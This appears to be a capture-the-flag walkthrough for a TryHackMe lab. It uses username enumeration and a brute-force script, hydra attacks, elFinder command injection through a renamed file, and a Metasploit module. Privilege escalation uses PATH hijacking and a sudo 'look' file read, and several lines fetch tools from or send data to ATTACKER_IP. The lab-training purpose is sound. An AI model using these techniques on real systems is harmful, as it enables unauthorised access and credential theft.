# Lookup Walkthrough
<br/>

## Intro
Welcome to the Lookup challenge, here is the link to the [room](https://tryhackme.com/room/lookup) on TryHackMe.

This time we are gonna be dealing with creating a python script to enumerate users, using Metasploit to gain a shell on the system and finally escalate our privileges.

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
Let's add the domain to the hosts file:
```bash
echo "MACHINE_IP lookup.thm" | sudo tee -a /etc/hosts
```

nmap scan:
```bash
nmap -sV -sC lookup.thm
```

The scan revealed 2 open ports:
```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
```

Let's visit the website at `http://lookup.thm`, we can see a login page.

Let's also enumerate directoryes -> this got me no interesting results.
Can now check for subdomains:
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -H "Host: FUZZ.lookup.thm" -u http://lookup.thm -fc 302
```
- `-fc 302`: hide that status code

This got me the subdomain `www`, so now let's add `www.lookup.thm` in the hosts file, on the same line as the previous entry.
If we try to visit this new subdomain it points to the same page as the main one.

Trying some usernames and password combos like: `test:test`, `admin:admin` i have noticed that the error message that we get is a bit different, for exaple in first case we  get:
- "wrong username or password",
- withe the second "wrong password"

This means that "admin" is a valid user. 
Let's enumerate users and when we find a valid username we brute force the password:
```python
# A script to enumerate users in the Lookup Challenge

#!/bin/python3
import requests
import sys

password_test="test"
url="http://lookup.thm/login.php"
error_message = "Wrong password. Please try again.<br>Redirecting in 3 seconds."

with open('/usr/share/seclists/Usernames/Names/names.txt', 'r') as file:
    usernames = [file.readline().strip() for _ in range(5000)]

with open('/home/blackarch/Documents/rockyou.txt', 'r') as file:
    password_list = [file.readline().strip() for _ in range(5000)]

def enumerate_usernames(url, username, password):
    for name in usernames:
        payload = {"username": name, "password": password_test }
        response = requests.post(url, data=payload)
        response_body = response.text 
        if "Wrong password. Please try again." in response_body and name != "admin":
            print("found a valid username", name)
            global final_username
            final_username = name
            break
        else :
            print(name, "is not a valid username")
            continue

enumerate_usernames(url, "", password_test)

choice = input("do you now want to brute-force it? yes/no")
if choice == "yes" :
    for pwd in password_list:
        payload_2 = {"username": final_username, "password": pwd }
        response = requests.post(url, data=payload_2)
        response_2_body = response.text 
        if error_message not in response_2_body
            print("found a valid password", pwd)
            final_pwd = pwd
            break
        else :
            print(pwd, "is not a valid password")
            continue

else: 
    print("bye")

print(final_username, ":" ,final_pwd)
```


Once the username is found you can choose if use the script to brute force the password or exit and use a tool like hydra:
```bash
hydra -l jose -P ~/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong Password" -V
```

Now we can finally login with `jose:REDACTED_PASSWORD`

After logging in we get this message: "Unknown host: files.lookup.thm", let's add `files.lookup.thm` domain in the hosts file.
Going back to the browser and refreshing the page now shows the *elfinder* application.

With that applicaton we can view and open a bunch of text files.
In the `credentials.txt` we find `think : nopassword`.
Also clicking the info button we can find the application version: 2.1.47.

A rapid search online shows that this version is vulnerable to code injection.
Let's reproduce it:
If you want to do it manually step by step folllow this report:https://www.synacktiv.com/ressources/advisories/elFinder_2.1.47_Command_Injection.pdf

enable Brup Proxy, than choose an image and upload it you sohuld see and URL like:
```http
GET /elFinder/php/connector.minimal.php?cmd=ls&target=l1_Lw&intersect%5B%5D=mullvad_browser.png&reqid=19692fd666d9e
```

Now rename the file to $(command_to_execute):
```http
GET /elFinder/php/connector.minimal.php?cmd=rename&name=%24(command_to_execute).png&target=l1_bXVsbHZhZF9icm93c2VyLnBuZw&reqid=1969308e29938c
```

Fianlly invoke the rotation feature to trigger the command execution!
If you choose this method ensure to have a listener ready and put a reverse shell payload as the command.

Otherwise we can leverage a metasploit module:
```
msfconsole
```
```bash
use unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```

Metasploit do not follow our hosts file for DNS queries, if not setted,  so for the moment let's add a static entry:
```bash
dns add-static files.lookup.thm MACHINE_IP
```

Now set:
```bash
set rhosts files.lookup.thm
```
```bash
set rhost YOUR_IP
```
```
run
```

Anyway you choosed by now you should have a shell as "www-data".

<br/>

### Privilege Escalation
Now we need to move to the "think" user.
First thing, uprade your shell. (I made a guide [here]() )
From my machine i transfered the `linpeas.sh` script on the target using a python HTTP server:
```bash
python3 -m http.server
```

On target:
```bash
wget http://ATTACKER_IP:8000/linpeas.sh
```

Now let's make the file executable and run it:
```bash
chmod +x linpeas.sh
```
```bash
./linpeas.sh > linpeas_report
```

For better readability i then transferred the report on my machine:
```bash
nc -lvnp 4445 > linpeas_report
```

On target:
```bash
nc -nv ATTACKER_IP 4445 < linpeas_report
```

It identified an unknown suid binary:: `/usr/sbin/pwm`.

If we try to run this ELF we get the message:
```
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

It tries to fetch the `.passwords` file, but we do not have it as our current user, we need a way to appear like "think".
Let's check the other user info:
```bash
id think
```
```
uid=1000(think) gid=1000(think) groups=1000(think)
```

Cool, now we create a fake `id`:
```bash
touch id
```
```bash
echo 'echo "uid=1002(think) gid=1002(think) groups=1002(think)"' > id
```

Make it executable:
```bash
chmod +x id
```

Change the PATH env variable value to the current directory:
```bash
export PATH=/tmp:$PATH
```

Now we run the executable again:
```
/usr/sbin/pwm
```

And we get:
```
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```

Well one here stand out `josemario.AKA(think)` but if you could not notice we could create a list with all of them and brute force ssh:
```bash
hydra -l think -P think_passwords.txt  ssh://10.10.180.84 -t  64 
```

Now we can finally login via SSH as "think"
```bash
ssh think@lookup.thm
```

Read the user flag:
```bash
cat user.txt
```
--> REDACTED

Check if we can run any command as sudo:
```bash
sudo -l
```

We do:
```
User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

We can find this binary on GTFObins, so we escalate the privileges to root with:
```bash
LFILE=/root/root.txt
```

```bash
sudo /usr/bin/look '' "$LFILE"
```

And here we have the flag:
--> REDACTED

<br/>
<br/>

## Conclusion
Congratulations you have successfully completed the challenge and practiced with differnt tools and methods to to exploit an application and escalate privileges to root.

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
